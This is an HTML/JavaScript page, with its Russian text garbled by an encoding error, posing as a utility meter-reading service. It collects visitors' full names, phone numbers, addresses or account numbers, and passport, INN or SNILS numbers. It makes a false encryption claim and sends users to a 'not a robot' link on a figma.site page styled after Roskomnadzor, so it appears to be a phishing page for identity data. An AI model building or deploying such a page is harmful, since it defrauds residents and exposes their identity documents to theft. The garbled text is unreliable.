<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ñ–ö–• Web App</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 font-sans">
    <div class="container mx-auto p-4 max-w-lg">
        <!-- Main Menu -->
        <div id="main-menu" class="space-y-4">
            <h1 class="text-2xl font-bold text-center">üè† –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –ñ–ö–•-–±–æ—Ç!</h1>
            <p class="text-center">üíß –£–ø—Ä–∞–≤–ª—è–π—Ç–µ —Å–≤–æ–∏–º–∏ —É—Å–ª—É–≥–∞–º–∏ –ª–µ–≥–∫–æ –∏ –±—ã—Å—Ç—Ä–æ! ‚ú®</p>
            <button onclick="showForm('fullname')" class="w-full bg-blue-500 text-white py-2 rounded hover:bg-blue-600">üî¢ –ü–µ—Ä–µ–¥–∞—Ç—å –ø–æ–∫–∞–∑–∞–Ω–∏—è</button>
            <button onclick="showFAQ()" class="w-full bg-gray-500 text-white py-2 rounded hover:bg-gray-600">‚ùì –ß–∞—Å—Ç—ã–µ –≤–æ–ø—Ä–æ—Å—ã</button>
            <button onclick="showInstructions()" class="w-full bg-gray-500 text-white py-2 rounded hover:bg-gray-600">‚ÑπÔ∏è –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è</button>
            <button onclick="showSupport()" class="w-full bg-gray-500 text-white py-2 rounded hover:bg-gray-600">üìû –°–≤—è–∑–∞—Ç—å—Å—è —Å —Ç–µ—Ö–ø–æ–¥–¥–µ—Ä–∂–∫–æ–π</button>
        </div>

        <!-- Form Section -->
        <div id="form-section" class="hidden space-y-4">
            <h2 id="form-title" class="text-xl font-semibold"></h2>
            <p id="form-warning" class="text-red-500 font-bold"></p>
            <input id="form-input" type="text" class="w-full p-2 border rounded" placeholder="–í–≤–µ–¥–∏—Ç–µ –¥–∞–Ω–Ω—ã–µ">
            <div id="form-options" class="space-y-2"></div>
            <button onclick="goBack()" class="w-full bg-gray-300 text-black py-2 rounded hover:bg-gray-400">‚Ü©Ô∏è –ù–∞–∑–∞–¥</button>
        </div>

        <!-- FAQ Section -->
        <div id="faq-section" class="hidden space-y-4">
            <h2 class="text-xl font-semibold">‚ùì –ß–∞—Å—Ç—ã–µ –≤–æ–ø—Ä–æ—Å—ã: üåü</h2>
            <button onclick="showFAQAnswer('deadline')" class="w-full bg-gray-200 py-2 rounded hover:bg-gray-300">‚è≥ –î–æ –∫–∞–∫–æ–≥–æ —á–∏—Å–ª–∞ –Ω—É–∂–Ω–æ –ø–µ—Ä–µ–¥–∞–≤–∞—Ç—å –ø–æ–∫–∞–∑–∞–Ω–∏—è?</button>
            <button onclick="showFAQAnswer('penalty')" class="w-full bg-gray-200 py-2 rounded hover:bg-gray-300">üí∏ –ß—Ç–æ –±—É–¥–µ—Ç, –µ—Å–ª–∏ –Ω–µ –ø–µ—Ä–µ–¥–∞—Ç—å –¥–∞–Ω–Ω—ã–µ –≤–æ–≤—Ä–µ–º—è?</button>
            <button onclick="showFAQAnswer('safe')" class="w-full bg-gray-200 py-2 rounded hover:bg-gray-300">üîí –≠—Ç–æ –±–µ–∑–æ–ø–∞—Å–Ω–æ?</button>
            <button onclick="showFAQAnswer('telegram')" class="w-full bg-gray-200 py-2 rounded hover:bg-gray-300">‚ö°Ô∏è –ü–æ—á–µ–º—É —Ç–µ–ø–µ—Ä—å —á–µ—Ä–µ–∑ Telegram?</button>
            <button onclick="showFAQAnswer('fix')" class="w-full bg-gray-200 py-2 rounded hover:bg-gray-300">üîÅ –ú–æ–∂–Ω–æ –ª–∏ –∏—Å–ø—Ä–∞–≤–∏—Ç—å –æ—à–∏–±–∫—É?</button>
            <button onclick="showFAQAnswer('documents')" class="w-full bg-gray-200 py-2 rounded hover:bg-gray-300">üìë –ö–∞–∫–∏–µ –¥–æ–∫—É–º–µ–Ω—Ç—ã –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å?</button>
            <button onclick="showMainMenu()" class="w-full bg-gray-300 text-black py-2 rounded hover:bg-gray-400">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –≤ –º–µ–Ω—é</button>
        </div>

        <!-- FAQ Answer Section -->
        <div id="faq-answer-section" class="hidden space-y-4">
            <h2 class="text-xl font-semibold">–û—Ç–≤–µ—Ç</h2>
            <p id="faq-answer" class="text-gray-700"></p>
            <button onclick="showFAQ()" class="w-full bg-gray-300 text-black py-2 rounded hover:bg-gray-400">‚Ü©Ô∏è –ù–∞–∑–∞–¥</button>
        </div>

        <!-- Instructions Section -->
        <div id="instructions-section" class="hidden space-y-4">
            <h2 class="text-xl font-semibold">‚ÑπÔ∏è –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è</h2>
            <p class="text-gray-700">
                üìã –ß—Ç–æ–±—ã –ø–µ—Ä–µ–¥–∞—Ç—å –ø–æ–∫–∞–∑–∞–Ω–∏—è:<br>
                1Ô∏è‚É£ –ù–∞–∂–º–∏—Ç–µ ¬´–£–∫–∞–∑–∞—Ç—å –§–ò–û¬ª.<br>
                2Ô∏è‚É£ –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞.<br>
                3Ô∏è‚É£ –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –ª–∏—Ü–µ–≤–æ–≥–æ —Å—á–µ—Ç–∞ –∏–ª–∏ –∞–¥—Ä–µ—Å.<br>
                4Ô∏è‚É£ –í—ã–±–µ—Ä–∏—Ç–µ –¥–æ–∫—É–º–µ–Ω—Ç –∏ –≤–≤–µ–¥–∏—Ç–µ –µ–≥–æ –Ω–æ–º–µ—Ä.<br>
                5Ô∏è‚É£ –ü–æ–ª—É—á–∏—Ç–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ. ‚ú®<br><br>
                –ù–∞ –ª—é–±–æ–º —ç—Ç–∞–ø–µ –≤—ã –º–æ–∂–µ—Ç–µ –Ω–∞–∂–∞—Ç—å '‚Ü©Ô∏è –ù–∞–∑–∞–¥', —á—Ç–æ–±—ã –≤–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞ –ø—Ä–µ–¥—ã–¥—É—â–∏–π —à–∞–≥. üíß
            </p>
            <button onclick="showMainMenu()" class="w-full bg-gray-300 text-black py-2 rounded hover:bg-gray-400">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –≤ –º–µ–Ω—é</button>
        </div>

        <!-- Support Section -->
        <div id="support-section" class="hidden space-y-4">
            <h2 class="text-xl font-semibold">üìû –°–≤—è–∑–∞—Ç—å—Å—è —Å —Ç–µ—Ö–ø–æ–¥–¥–µ—Ä–∂–∫–æ–π</h2>
            <p class="text-gray-700">
                –î–ª—è —Å–≤—è–∑–∏ —Å —Ç–µ—Ö–ø–æ–¥–¥–µ—Ä–∂–∫–æ–π –ø–µ—Ä–µ–π–¥–∏—Ç–µ –ø–æ —Å—Å—ã–ª–∫–µ: <a href="tg://resolve?domain=techsupgkh" class="text-blue-500">@techsupgkh</a> ‚ú®
            </p>
            <button onclick="showMainMenu()" class="w-full bg-gray-300 text-black py-2 rounded hover:bg-gray-400">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –≤ –º–µ–Ω—é</button>
        </div>

        <!-- Confirmation Section -->
        <div id="confirmation-section" class="hidden space-y-4">
            <h2 class="text-xl font-semibold">–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ</h2>
            <p class="text-gray-700">–î–ª—è –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ, —á—Ç–æ –≤—ã –Ω–µ —Ä–æ–±–æ—Ç! ‚ú®</p>
            <a href="https://roskomnadzor.figma.site/" target="_blank" class="w-full bg-green-500 text-white py-2 rounded hover:bg-green-600 text-center block">‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å, —á—Ç–æ —è –Ω–µ —Ä–æ–±–æ—Ç</a>
            <button onclick="showMainMenu()" class="w-full bg-gray-300 text-black py-2 rounded hover:bg-gray-400">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –≤ –º–µ–Ω—é</button>
        </div>
    </div>

    <script>
        let currentState = 'main';
        let formData = {
            fullname: '',
            phone: '',
            account_or_address_choice: '',
            account_or_address_value: '',
            document_type: '',
            document_number: ''
        };

        function showMainMenu() {
            document.getElementById('main-menu').classList.remove('hidden');
            document.getElementById('form-section').classList.add('hidden');
            document.getElementById('faq-section').classList.add('hidden');
            document.getElementById('faq-answer-section').classList.add('hidden');
            document.getElementById('instructions-section').classList.add('hidden');
            document.getElementById('support-section').classList.add('hidden');
            document.getElementById('confirmation-section').classList.add('hidden');
            currentState = 'main';
            formData = { fullname: '', phone: '', account_or_address_choice: '', account_or_address_value: '', document_type: '', document_number: '' };
        }

        function showForm(state) {
            currentState = state;
            document.getElementById('main-menu').classList.add('hidden');
            document.getElementById('form-section').classList.remove('hidden');
            document.getElementById('form-options').innerHTML = '';
            document.getElementById('form-warning').innerHTML = '<b>–£–ö–ê–ó–´–í–ê–ô–¢–ï –¢–û–õ–¨–ö–û –°–í–û–ò –î–ê–ù–ù–´–ï</b>';
            const input = document.getElementById('form-input');
            input.value = formData[state] || '';
            input.focus();

            if (state === 'fullname') {
                document.getElementById('form-title').textContent = 'üë§ –£–∫–∞–∂–∏—Ç–µ –§–∞–º–∏–ª–∏—é –ò–º—è –û—Ç—á–µ—Å—Ç–≤–æ –ø–æ–ª–Ω–æ—Å—Ç—å—é (—Ç–æ–ª—å–∫–æ —Ç–µ–∫—Å—Ç):';
            } else if (state === 'phone') {
                document.getElementById('form-title').textContent = 'üìû –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ (–Ω–∞—á–Ω–∏—Ç–µ —Å +7 –∏–ª–∏ 7, –Ω–∞–ø—Ä–∏–º–µ—Ä: +79991234567):';
            } else if (state === 'account_or_address_choice') {
                document.getElementById('form-title').textContent = '–í—ã–±–µ—Ä–∏—Ç–µ —Å–ø–æ—Å–æ–± –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏: üåü';
                document.getElementById('form-input').classList.add('hidden');
                document.getElementById('form-options').innerHTML = `
                    <button onclick="selectChoice('üè† –ê–¥—Ä–µ—Å')" class="w-full bg-blue-200 py-2 rounded hover:bg-blue-300">üè† –ê–¥—Ä–µ—Å</button>
                    <button onclick="selectChoice('üí≥ –õ–∏—Ü–µ–≤–æ–π —Å—á—ë—Ç')" class="w-full bg-blue-200 py-2 rounded hover:bg-blue-300">üí≥ –õ–∏—Ü–µ–≤–æ–π —Å—á—ë—Ç</button>
                `;
            } else if (state === 'account_or_address_value') {
                document.getElementById('form-input').classList.remove('hidden');
                document.getElementById('form-title').textContent = formData.account_or_address_choice === 'üè† –ê–¥—Ä–µ—Å' 
                    ? '–í–≤–µ–¥–∏—Ç–µ –≤–∞—à –∞–¥—Ä–µ—Å (–ø—Ä–∏–º–µ—Ä: –≥. –ú–æ—Å–∫–≤–∞, —É–ª. –õ–µ–Ω–∏–Ω–∞, –¥. 10):' 
                    : '–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –ª–∏—Ü–µ–≤–æ–≥–æ —Å—á—ë—Ç–∞ (–ø—Ä–∏–º–µ—Ä: 40817810099910004312):';
            } else if (state === 'document_type') {
                document.getElementById('form-title').textContent = '–í—ã–±–µ—Ä–∏—Ç–µ –¥–æ–∫—É–º–µ–Ω—Ç: üåü';
                document.getElementById('form-input').classList.add('hidden');
                document.getElementById('form-options').innerHTML = `
                    <button onclick="selectDocument('–ü–∞—Å–ø–æ—Ä—Ç')" class="w-full bg-blue-200 py-2 rounded hover:bg-blue-300">üìÑ –ü–∞—Å–ø–æ—Ä—Ç</button>
                    <button onclick="selectDocument('–ò–ù–ù')" class="w-full bg-blue-200 py-2 rounded hover:bg-blue-300">üßæ –ò–ù–ù</button>
                    <button onclick="selectDocument('–°–ù–ò–õ–°')" class="w-full bg-blue-200 py-2 rounded hover:bg-blue-300">üü¢ –°–ù–ò–õ–°</button>
                `;
            } else if (state === 'document_number') {
                document.getElementById('form-input').classList.remove('hidden');
                document.getElementById('form-title').textContent = `–í–≤–µ–¥–∏—Ç–µ ${formData.document_type} (–ø—Ä–∏–º–µ—Ä: ${formData.document_type === '–ü–∞—Å–ø–æ—Ä—Ç' ? '4510 123456' : formData.document_type === '–ò–ù–ù' ? '500100732259' : '112-233-445 95'}):`;
            }
        }

        function selectChoice(choice) {
            formData.account_or_address_choice = choice;
            saveData();
            showForm('account_or_address_value');
        }

        function selectDocument(doc) {
            formData.document_type = doc;
            saveData();
            showForm('document_number');
        }

        function goBack() {
            if (currentState === 'fullname') {
                showMainMenu();
            } else if (currentState === 'phone') {
                showForm('fullname');
            } else if (currentState === 'account_or_address_choice') {
                showForm('phone');
            } else if (currentState === 'account_or_address_value') {
                showForm('account_or_address_choice');
            } else if (currentState === 'document_type') {
                showForm('account_or_address_value');
            } else if (currentState === 'document_number') {
                showForm('document_type');
            }
        }

        function saveData(isComplete = false) {
            const timestamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
            const userId = 'web_user_' + Math.random().toString(36).substring(2, 15);
            const username = 'web_user';
            const userWithBot = `@${username} (–ñ–ö–•)`;
            const record = `${timestamp}\t${userId}\t${userWithBot}\t${formData.fullname}\t${formData.phone}\t${formData.account_or_address_choice} ${formData.account_or_address_value}\t${formData.document_type} ${formData.document_number}\n`;

            let records = localStorage.getItem('reg.txt') || '';
            records += record;
            localStorage.setItem('reg.txt', records);
            console.log('Saved:', record.trim());

            if (isComplete) {
                document.getElementById('form-section').classList.add('hidden');
                document.getElementById('confirmation-section').classList.remove('hidden');
                currentState = 'confirmation';
            }
        }

        document.getElementById('form-input').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                const value = e.target.value.trim();
                if (currentState === 'fullname') {
                    if (!/^[–ê-–Ø–∞-—è–Å—ë\s-]+$/.test(value)) {
                        alert('‚ùå –§–ò–û –¥–æ–ª–∂–Ω–æ —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ç–æ–ª—å–∫–æ –±—É–∫–≤—ã. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞. üî•');
                        return;
                    }
                    formData.fullname = value.replace(/\s+/g, ' ');
                    saveData();
                    showForm('phone');
                } else if (currentState === 'phone') {
                    const digits = value.replace(/[^0-9]/g, '');
                    if (!value.startsWith('+7') && !value.startsWith('7')) {
                        alert('‚ùå –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –¥–æ–ª–∂–µ–Ω –Ω–∞—á–∏–Ω–∞—Ç—å—Å—è —Å +7 –∏–ª–∏ 7. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞. üî•');
                        return;
                    }
                    if (digits.length < 10 || digits.length > 11) {
                        alert('‚ùå –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å 10 –∏–ª–∏ 11 —Ü–∏—Ñ—Ä. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞. üî•');
                        return;
                    }
                    formData.phone = value;
                    saveData();
                    showForm('account_or_address_choice');
                } else if (currentState === 'account_or_address_value') {
                    if (formData.account_or_address_choice === 'üè† –ê–¥—Ä–µ—Å') {
                        if (value.length < 5 || !/\d/.test(value)) {
                            alert('‚ùå –£–∫–∞–∂–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –∞–¥—Ä–µ—Å (–ø—Ä–∏–º–µ—Ä: –≥. –ú–æ—Å–∫–≤–∞, —É–ª. –õ–µ–Ω–∏–Ω–∞, –¥. 10). –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞. üî•');
                            return;
                        }
                    } else {
                        if (!/^\d+$/.test(value) || value.length < 4) {
                            alert('‚ùå –ù–æ–º–µ—Ä –ª–∏—Ü–µ–≤–æ–≥–æ —Å—á—ë—Ç–∞ –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ç–æ–ª—å–∫–æ —Ü–∏—Ñ—Ä—ã (–Ω–µ –º–µ–Ω–µ–µ 4). –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞. üî•');
                            return;
                        }
                    }
                    formData.account_or_address_value = value;
                    saveData();
                    showForm('document_type');
                } else if (currentState === 'document_number') {
                    formData.document_number = value;
                    saveData(true);
                }
            }
        });

        function showFAQ() {
            document.getElementById('main-menu').classList.add('hidden');
            document.getElementById('faq-section').classList.remove('hidden');
            currentState = 'faq';
        }

        function showFAQAnswer(answer) {
            document.getElementById('faq-section').classList.add('hidden');
            document.getElementById('faq-answer-section').classList.remove('hidden');
            const answers = {
                'deadline': 'üìå –ü–æ–∫–∞–∑–∞–Ω–∏—è —Å—á–µ—Ç—á–∏–∫–æ–≤ –≤–æ–¥—ã –∏ —ç–ª–µ–∫—Ç—Ä–æ—ç–Ω–µ—Ä–≥–∏–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–µ—Ä–µ–¥–∞–≤–∞—Ç—å –¥–æ 25 —á–∏—Å–ª–∞ –∫–∞–∂–¥–æ–≥–æ –º–µ—Å—è—Ü–∞. üíß',
                'penalty': '‚ö†Ô∏è –ü–ª–∞—Ç–∞ –±—É–¥–µ—Ç –Ω–∞—á–∏—Å–ª–µ–Ω–∞ –ø–æ —Å—Ä–µ–¥–Ω–µ–º—É ‚Äî –∏—Å—Ö–æ–¥—è –∏–∑ –ø–æ–∫–∞–∑–∞–Ω–∏–π –ø—Ä–∏–±–æ—Ä–æ–≤ —É—á–µ—Ç–∞ –∑–∞ –ø–æ—Å–ª–µ–¥–Ω–∏–µ –ø–æ–ª–≥–æ–¥–∞. üî•',
                'safe': 'üîê –î–∞, —É –Ω–∞—Å —Å—Ç–æ–∏—Ç –∑–∞—â–∏—Ç–∞ VISION 3.87676 PRO VS (—Å–∫–≤–æ–∑–Ω–æ–µ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ). ‚ú®',
                'telegram': '‚ö°Ô∏è –í —Å–≤—è–∑–∏ —Å –Ω–µ—Å—Ç–∞–±–∏–ª—å–Ω–æ–π —Ä–∞–±–æ—Ç–æ–π web-–ø–ª–∞—Ç—Ñ–æ—Ä–º –±—ã–ª —Å–æ–∑–¥–∞–Ω –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–π —Ä–µ—Å—É—Ä—Å. üíß',
                'fix': '‚úÖ –î–∞, –º–æ–∂–Ω–æ. –°–≤—è–∂–∏—Ç–µ—Å—å —Å —Ç–µ—Ö–ø–æ–¥–¥–µ—Ä–∂–∫–æ–π –∏–ª–∏ –ø–æ–≤—Ç–æ—Ä–∏—Ç–µ –≤–≤–æ–¥. üåü',
                'documents': 'üëâ –ü–∞—Å–ø–æ—Ä—Ç, –ò–ù–ù, –°–ù–ò–õ–° –∏–ª–∏ –õ–∏—Ü–µ–≤–æ–π —Å—á—ë—Ç. üíß'
            };
            document.getElementById('faq-answer').textContent = answers[answer];
            currentState = 'faq-answer';
        }

        function showInstructions() {
            document.getElementById('main-menu').classList.add('hidden');
            document.getElementById('instructions-section').classList.remove('hidden');
            currentState = 'instructions';
        }

        function showSupport() {
            document.getElementById('main-menu').classList.add('hidden');
            document.getElementById('support-section').classList.remove('hidden');
            currentState = 'support';
        }
    </script>
</body>
</html>
